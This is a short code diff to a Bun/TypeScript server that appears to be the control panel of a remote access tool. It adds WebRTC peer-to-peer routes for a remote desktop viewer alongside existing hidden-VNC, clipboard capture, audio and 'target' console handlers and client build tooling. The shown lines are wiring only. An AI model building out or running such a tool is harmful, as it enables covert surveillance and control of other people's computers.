@@ -37,6 +37,7 @@ import { handleFileShareRoutes } from "./server/routes/file-share-routes";
 import { handleUsersRoutes } from "./server/routes/users-routes";
 import { handleWebSocketClose, handleWebSocketMessage, handleWebSocketOpen } from "./server/routes/websocket-lifecycle-routes";
 import { handleWsUpgradeRoutes } from "./server/routes/ws-upgrade-routes";
+import { handleWebrtcRoutes } from "./server/routes/webrtc-routes";
 import { isAuthorizedAgentRequest } from "./server/agent-auth";
 import { generateBuildMutex, sanitizeMutex, sanitizeOutputName } from "./server/build-utils";
 import { detectUploadOs, normalizeClientOs, type DeployOs } from "./server/deploy-utils";
@@ -95,6 +96,9 @@ import {
   handleHVNCInstalledAppsResult,
   handleHVNCDXGIStatus,
   handleClipboardContent,
+  handleWebrtcP2PAnswer,
+  handleWebrtcP2PIce,
+  cleanupRdViewerP2P,
   handleRemoteDesktopViewerMessage,
   handleRemoteDesktopViewerOpen,
   hvncStreamingState,
@@ -674,6 +678,9 @@ async function startServer() {
     handleHVNCInstalledAppsResult,
     handleHVNCDXGIStatus,
     handleClipboardContent,
+    handleWebrtcP2PAnswer,
+    handleWebrtcP2PIce,
+    cleanupRdViewerP2P,
     cleanupVoiceViewer,
     cleanupDesktopAudioViewer,
     stopConsoleOnTarget,
@@ -689,7 +696,7 @@ async function startServer() {
     broadcastClientEvent: notificationPluginHandlers.broadcastClientLifecycleEvent,
   };
 
-  const server = Bun.serve<SocketData, {}>({
+  const server = Bun.serve<SocketData>({
     port: PORT,
     hostname: HOST,
     ...(tls ? { tls: tls.tlsOptions } : {}),
@@ -718,6 +725,7 @@ async function startServer() {
         (req, url) => handleMiscRoutes(req, url, routeDeps.misc),
         (req, url) => handleAssetsRoutes(req, url, routeDeps.assets),
         (req, url) => handlePageRoutes(req, url, routeDeps.page),
+        (req, url) => handleWebrtcRoutes(req, url),
         (req, url, srv) => handleClientRoutes(req, url, srv as any, routeDeps.client),
         (req, url, srv) => handleWsUpgradeRoutes(req, url, srv as any, routeDeps.wsUpgrade),
       ],
